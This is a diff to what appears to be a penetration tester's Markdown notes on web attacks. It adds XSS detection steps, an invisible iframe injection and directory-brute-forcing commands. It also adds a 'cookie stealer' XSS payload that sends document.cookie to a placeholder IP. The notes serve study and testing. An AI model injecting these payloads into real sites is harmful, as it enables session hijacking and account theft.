@@ -78,6 +78,19 @@ For payloads refer to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/
 
 1. Detect XXS
 
+Submit special characters and see if they are later present in the source code
+
+``` " ; < > ```
+
+It may look like so
+
+```
+<td> John</td><td>I would eat tacos here every day if I could!</td></tr><tr><td> ok</td><td>doki</td></tr><tr><td> fg</td><td>" ; < > ' '</td></tr>	
+```
+
+
+2. Confirm XXS
+
 Alert() is dead: https://portswigger.net/research/alert-is-dead-long-live-print
 
 Use print() instead or use only firefox browser for testing. But this would fail if user uses Chrome and its derivates.
@@ -92,8 +105,36 @@ Payloads: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 #get host ip
 <script>print(window.location.host)</script>
 
+```
+
+## iframe injection
+
+* Invisible iframe can be inserted into unsanitzed input
 
 ```
+<iframe src=http://google.com height=”0” width=”0”></iframe>
+```
+This can be however filtered out by user's browser
+
+## Cookies manipulation
+
+### Important security parameters
+
+* Secure: only send the cookie over HTTPS. This protects the cookie from being sent in cleartext and captured over the network.
+
+* HttpOnly: deny JavaScript access to the cookie. If this flag is not set, we can use an XSS payload can steal the cookie.
+
+### Cookie Stealer Sample script
+
+1. Find XSS vulnerability
+2. Craft and inject payload
+```
+<scirpt>new Image().src="http://IP/some.jpg?output="+document.cookie;</script>
+```
+
+### Use Kali's BeEF
+
+Test more XSS scenarios using BeEF tool.
 
 ## Insecure Deserialization
 
@@ -120,14 +161,17 @@ Then find the framework on: https://wiki.owasp.org/index.php/OWASP_favicon_datab
 
 ## My approach to Dirbusting
 
-1. scan for common directories non recursively with gobuster first:
+1. Quick scan with default dirb without recusive folder search
+`dirb http://IP/ -r`
+
+2. scan for common directories non recursively with gobuster first:
 `gobuster dir -u http://ip -w /usr/share/seclists/Discovery/Web-Content/common.txt`
 
-2. then scan recursively within found directories
+3. then scan recursively within found directories
 
 `dirb http://ip /usr/share/seclists/Discovery/Web-Content/big.txt -X .html,.php,.cgi`
 
-3. finally you can also fuzz the discovered content or anything else within head or requests
+4. finally you can also fuzz the discovered content or anything else within head or requests
 
 `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://ip/FUZZ` (FUZZ keyword is there where you want to fuzz)
 
